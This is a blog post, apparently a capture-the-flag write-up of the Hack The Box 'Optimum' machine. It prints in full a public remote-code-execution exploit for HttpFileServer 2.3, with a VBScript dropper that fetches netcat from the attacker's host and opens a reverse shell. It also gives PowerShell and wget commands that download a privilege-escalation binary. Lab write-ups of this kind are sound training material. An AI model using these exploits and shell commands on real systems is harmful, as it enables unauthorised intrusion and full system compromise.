---
layout:     post
title:      Hackthebox Notes Optimum Pwned
date:       2021-01-31
summary:    Run against Optimum machine on Hackthebox.eu
categories: CTF
thumbnail: cogs
tags:
 - CTF
 - Hackthebox
 - Owned
---

# Optimum  
I have no idea how this one will go.  
Started out with autorecon scan, which took so much longer than my typical #nmap -sV -A -p- -oN outfile ipaddress scan.  
Autorecon scans have finished.  
Nothing unremarkable, port 80 open with HFS 2.3 marked as service version.  
Navigated to 10.10.10.8:80 in browser, and yeah it's a webserver with HttpFileServer 2.3.  
Searched exploit-db for httpfileserver 2.3, found some exploits  
Reviewed code for exploits and chose the Remote Code Execution exploit that looked the most promising, https://www.exploit-db.com/exploits/39161  
{% highlight ruby %}
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
{% endhighlight %}  
I immediately reassigned the variables ip_addr & local_port to match my own.  
I then pasted the variable vbs into an http decoder.  
{% highlight ruby %}
"C:\Users\Public\script.vbs|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://" ip_addr "/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with"
{% endhighlight %}
So essentially, the vbs script will look for nc.exe (netcat binary) at ip_addr (my vpn IP), and save it to C:\Users\Public.  
Afterward, the exploit code will execute nc.exe in CMD at my ip address and given port.  
So I copied nc.exe to a folder on my machine, and started an http server with #python3 -m http.server (this is python3 syntax).  
I then started a netcat server with #nc -lnvp portnumber, where portnumber matches local_port from above script.  
I then executed the exploit from my terminal with $python3 exploit.py 10.10.10.8 80.  
It errored out.  
I did some finagling and edited/troubleshot all the way down to the very bottom of the script (print statement), then I realized that the python script is written for python 2.7.  
So I un-finagled the script, and ran it again with $/usr/bin/python2.7 exploit.py 10.10.10.8 80.  
Exploit ran, I saw the http server I started hand out nc.exe with a 200 OK, and the open netcat shell connected with a CMD prompt.  
I navigated to user desktop and type'ed flag, then ran systeminfo.  
Meanwhile, on my own machine, I located windows-exploit-suggester.  I updated it, pasted the sysinfo content into a systeminfo.txt, and ran the script with the updated database and txt.  
Apparently this machine is vulnerable to an integer overflow.  
I downloaded the suggested exploit with $wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe into the http.server directory.  
I then closed and started up a new http.server at a different port.  
I messed around with a few variants of downloading via powershell and eventually this one worked:  
>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://vpnIP:PORT/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"  
I then navigated to that directory and executred the new exploit.  
I saw no special output in the shell, until I ran whoami.  
{% highlight ruby %}
nt authority/system
{% endhighlight %}
Yep, that's me!  
I then navigated to the Administrator's desktop and type'd the root flag.  
Another machine from the TJ Null OSCP Prep list complete.  This makes 11 machines rooted so far.  
